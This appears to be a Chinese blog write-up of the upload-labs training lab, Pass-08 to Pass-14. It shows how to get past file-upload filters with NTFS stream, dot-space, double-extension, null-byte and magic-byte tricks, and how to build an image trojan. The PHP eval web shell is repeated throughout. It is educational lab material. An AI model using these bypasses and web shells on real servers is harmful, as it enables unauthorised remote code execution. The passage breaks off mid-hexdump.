&lt;h2&gt;Pass-08&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-08&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-08&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;尝试 &lt;strong&gt;::$DATA&lt;/strong&gt; 绕过，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-21-49.b949ohldd.webp&#34; alt=&#34;PixPin_2025-05-09_16-21-49&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-27-52.magja8n6.webp&#34; alt=&#34;PixPin_2025-05-09_16-27-52&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-09&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-09&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-09&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;尝试 &lt;strong&gt;点空格点绕过&lt;/strong&gt;，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-52-41.969yk8a7oc.webp&#34; alt=&#34;PixPin_2025-05-09_16-52-41&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-00-12.1sf9bgz0qs.webp&#34; alt=&#34;PixPin_2025-05-09_17-00-12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-10&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-10&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-10&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;尝试 &lt;strong&gt;后缀双写&lt;/strong&gt;，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-03-49.26lp2cccua.webp&#34; alt=&#34;PixPin_2025-05-09_17-03-49&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-00-12.1sf9bgz0qs.webp&#34; alt=&#34;PixPin_2025-05-09_17-00-12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-11&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-11&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-11&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 失败，判断为 &lt;strong&gt;白名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp&#34; alt=&#34;PixPin_2025-05-09_17-10-29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200&#34;&gt;
  &lt;p class=&#34;hx-flex hx-items-center hx-font-medium&#34;&gt;&lt;svg height=16px class=&#34;hx-inline-block hx-align-middle hx-mr-2&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;

  &lt;div class=&#34;hx-w-full hx-min-w-0 hx-leading-7&#34;&gt;
    &lt;div class=&#34;hx-mt-6 hx-leading-7 first:hx-mt-0&#34;&gt;&lt;p&gt;PHP ≤ 5.3.3 ，&lt;code&gt;php.ini&lt;/code&gt; 配置 &lt;code&gt;magic_quotes_gpc = Off&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;尝试 &lt;strong&gt;%00 截断&lt;/strong&gt;，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-43-34.5c171blndq.webp&#34; alt=&#34;PixPin_2025-05-09_17-43-34&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-45-03.54xz5w1ccb.webp&#34; alt=&#34;PixPin_2025-05-09_17-45-03&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-12&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-12&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-12&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 失败，判断为 &lt;strong&gt;白名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp&#34; alt=&#34;PixPin_2025-05-09_17-10-29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;尝试 &lt;strong&gt;0x00 截断&lt;/strong&gt; （先使用空格进行占位，再修改为 &lt;code&gt;00&lt;/code&gt;），上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-48-43.esq7heez2.webp&#34; alt=&#34;PixPin_2025-05-09_17-48-43&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-49-20.2veymem0rp.webp&#34; alt=&#34;PixPin_2025-05-09_17-49-20&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-45-03.54xz5w1ccb.webp&#34; alt=&#34;PixPin_2025-05-09_17-45-03&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-13&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-13&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-13&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 失败，判断为 &lt;strong&gt;检查内容&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_18-08-18.9o008w0nab.webp&#34; alt=&#34;PixPin_2025-05-09_18-08-18&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;为 &lt;code&gt;fish1.php&lt;/code&gt; 添加 &lt;strong&gt;文件头&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;Hex 文件签名&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;ISO 8859-1&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;文件扩展名&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;FF D8 FF DB&lt;/code&gt;&lt;br/&gt;&lt;code&gt;FF D8 FF E0 00 10 4A 46 49 46 00 01&lt;/code&gt;&lt;br/&gt;&lt;code&gt;FF D8 FF EE&lt;/code&gt;&lt;br/&gt;&lt;code&gt;FF D8 FF E1 ?? ?? 45 78 69 66 00 00&lt;/code&gt;&lt;br/&gt;&lt;code&gt;FF D8 FF E0&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;ÿØÿÛ&lt;/code&gt;&lt;br/&gt;&lt;code&gt;ÿØÿà␀␐JFIF␀␁&lt;/code&gt;&lt;br/&gt;&lt;code&gt;ÿØÿî&lt;/code&gt;&lt;br/&gt;&lt;code&gt;ÿØÿá??Exif␀␀&lt;/code&gt;&lt;br/&gt;&lt;code&gt;ÿØÿà&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;jpg&lt;/code&gt;&lt;br/&gt;&lt;code&gt;jpeg&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;89 50 4E 47 0D 0A 1A 0A&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;‰PNG␍␊␚␊&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;png&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;47 49 46 38 37 61&lt;/code&gt;&lt;br/&gt;&lt;code&gt;47 49 46 38 39 61&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;GIF87a&lt;/code&gt;&lt;br/&gt;&lt;code&gt;GIF89a&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;gif&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;1、jpg&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;11&lt;/code&gt; 进行占位&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div class=&#34;filename not-prose&#34; dir=&#34;auto&#34;&gt;fish2.php&lt;/div&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;11&amp;lt;?php @eval($_POST[&amp;#39;fish&amp;#39;]) ?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;使用 &lt;code&gt;hexedit&lt;/code&gt; 替换 &lt;code&gt;11&lt;/code&gt; 为 &lt;code&gt;jpg&lt;/code&gt; 文件签名 &lt;code&gt;FF D8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_18-28-59.7pic38lj4.webp&#34; alt=&#34;PixPin_2025-05-09_18-28-59&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传 &lt;code&gt;fish2.php&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-12-29.2veymhle0a.webp&#34; alt=&#34;PixPin_2025-05-09_19-12-29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2、png&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;11&lt;/code&gt; 进行占位&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div class=&#34;filename not-prose&#34; dir=&#34;auto&#34;&gt;fish3.php&lt;/div&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;11&amp;lt;?php @eval($_POST[&amp;#39;fish&amp;#39;]) ?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;使用 &lt;code&gt;hexedit&lt;/code&gt; 替换 &lt;code&gt;11&lt;/code&gt; 为 &lt;code&gt;png&lt;/code&gt; 文件签名 &lt;code&gt;89 50&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-29-50.icc5atgqa.webp&#34; alt=&#34;PixPin_2025-05-09_19-29-50&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传 &lt;code&gt;fish3.php&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-31-07.wirw63qfj.webp&#34; alt=&#34;PixPin_2025-05-09_19-31-07&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;3、gif&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;11&lt;/code&gt; 进行占位&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div class=&#34;filename not-prose&#34; dir=&#34;auto&#34;&gt;fish4.php&lt;/div&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;11&amp;lt;?php @eval($_POST[&amp;#39;fish&amp;#39;]) ?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;使用 &lt;code&gt;hexedit&lt;/code&gt; 替换 &lt;code&gt;11&lt;/code&gt; 为 &lt;code&gt;gif&lt;/code&gt; 文件签名 &lt;code&gt;47 49&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-36-50.pfk0qon3i.webp&#34; alt=&#34;PixPin_2025-05-09_19-36-50&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传 &lt;code&gt;fish4.php&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-38-01.86tv783uwl.webp&#34; alt=&#34;PixPin_2025-05-09_19-38-01&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-14&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-14&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-14&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 失败，判断为 &lt;strong&gt;白名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp&#34; alt=&#34;PixPin_2025-05-09_17-10-29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;尝试 &lt;strong&gt;上传图片马&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将 &lt;code&gt;fish1.php&lt;/code&gt; 追加到 &lt;code&gt;fish_real.jpg&lt;/code&gt; 末尾，生成 &lt;code&gt;fish_trojan.jpg&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat fish_real.jpg fish1.php &amp;gt; fish_trojan.jpg&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;查看 &lt;code&gt;fish_trojan.jpg&lt;/code&gt; 最后 10 行的数据内容，确认一句话木马被正确追加&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;hailo㉿kali-Hailo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/workspace/upload-labs&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ hexdump -C fish_trojan.jpg &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tail
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0003b200  &lt;span class=&#34;m&#34;&gt;93&lt;/span&gt; f8 &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt; c6 b7 8d &lt;span class=&#34;m&#34;&gt;49&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt;  b5 &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; c6 7a &lt;span class=&#34;m&#34;&gt;51&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;70&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; c3  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;..U...I&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;...zQp&lt;span class=&#34;s2&#34;&gt;&amp;#34;.|
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b210  7a d0 0b 8f 53 4e ef 4a  25 6c f4 14 5c 06 ac a7  |z...SN.J%l..\...|
